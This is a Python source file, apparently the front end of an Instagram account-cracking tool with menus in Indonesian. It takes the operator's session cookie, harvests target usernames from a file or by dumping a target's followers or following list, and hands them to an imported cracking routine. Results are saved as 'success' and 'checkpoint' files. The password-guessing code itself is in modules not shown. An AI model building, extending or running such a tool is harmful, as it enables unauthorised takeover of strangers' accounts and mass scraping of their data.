import insta,os,time,secret,json
from asset import ighack, api

D='\x1b[32m'
A='\x1b[37m'
B='\x1b[38;5;46m'

class igrun:
    def __init__(self):
        self.cookie_cache = 'data/cookie.txt'

    def user_is_login(self):
        if os.path.isfile(self.cookie_cache) == False:
            return False
        return True
    
    def user_login(self):
        ighack.C('Anonymous')
        self.cookie = input('[?] Paste instagram cookie : ')
        self.signin = api.api(self.cookie).login()
        
        if self.signin['isvalid'] == False:self.user_login()
        with open(self.cookie_cache,mode='w') as self.f:self.f.write(self.cookie);self.f.close()

        self.config = {'fresh':True,**self.signin}
        self.menu(self.config)

    def menu(self, config):
        if not config['fresh']:
            if (self.user_is_login()):
                self.cookie = open(self.cookie_cache,'r').read()
                self.signin = api.api(self.cookie).login()
                if self.signin['isvalid'] == False:self.user_login()
            else:
                self.user_login()
        else:
            self.cookie = open(self.cookie_cache,'r').read()
            self.signin = config
        ighack.C(self.signin['nama'])
        exp = secret.check_license()
        if not exp:
            os.remove('device.key')
            exit()
        print(f'[ {B}{self.signin["nama"]}{A} ]\n\n[+] Berlaku sampai : {B}{exp}{A}\n')
        mainmenu = input(f'''[{B}1{A}]. Crack dari file
[{B}2{A}]. Crack dari pengikut/mengikuti
[{B}3{A}]. Keluar

[{B}?{A}] Memilih: ''')
        if mainmenu == '1':
            users_data=set()
            nama_file = input(f'\n[{B}?{A}] Nama file : {B}')
            pemisahan = input(f'{A}[{B}?{A}] Pemisahan username dan fullname : ')
            for users in open(nama_file,'r').read().splitlines():
                uid,name=users.split(pemisahan)
                data = json.dumps({
                    'node': {
                    'id': '',
                    'node': '',
                    'username': uid,
                    'full_name': name
                    }
                })
                users_data.add(data)
            xyz= list(users_data)
            insta.Insta(xyz)

        elif mainmenu == '2':
            self.username = input(f'[{B}?{A}] Paste target username : ').split(',')
            self.list_user = api.api(self.cookie).public_userid(self.username)
            if len(self.list_user) == 0:print('\n[+] cari target lain.');time.sleep(2);self.menu(config)
            ask2 = input(f'\n[{B}1{A}] From followers\n[{B}2{A}] From following\n\n[{B}?{A}] Choose : {B}')
            if ask2 == '1':mode = True
            else:mode = False
            unique_items = set()

            for user_id in self.list_user:
                print(f'\n{A}[{B}~{A}] Processing user: {user_id}')

                data = api.api(self.cookie).dump_users(user_id, '', mode)

                if data['error_message']:
                    print(f'[!] Error for user {user_id}: {data["error_message"]}')
                    continue
                
                before_count = len(unique_items)
                for item in data['yamete_id_list']:
                    unique_items.add(item)

                added_count = len(unique_items) - before_count
                print(f'\n\n[+] User {user_id}: {added_count} new unique items added')
                print(f'[+] Total unique items so far: {len(unique_items)}')

            araay_ku = list(unique_items)
            print(f'\n[✓] Completed! Total unique items collected: {len(araay_ku)}')
            insta.Insta(araay_ku)
        
        elif mainmenu == '3':
            os.remove('data/cookie.txt')
            exit()

    def menu_start(self):
        ighack.C('Anonymous')
        menu_ask = input(f'\n[{B}1{A}] Cek hasil [{B}2{A}] Mulai crack [{B}3{A}] Keluar\n\n[{B}?{A}] Choice : ')
        if menu_ask == '1':
            files = os.listdir('data')
            print()
            for i in files:
                if 'success' in i or 'checkpoint' in i:
                    print('* --> data/' +i)
            nama_file = input(f'\n[{B}?{A}] nama file : ');print()
            for d in open(nama_file,'r').read().splitlines():print(d)
        elif menu_ask == '2':igrun().menu(config)
        else:exit('\n[+] Dadah.')


config = {'fresh':False,'nama':'Anonymous','isvalid':False}
igrun().menu_start()
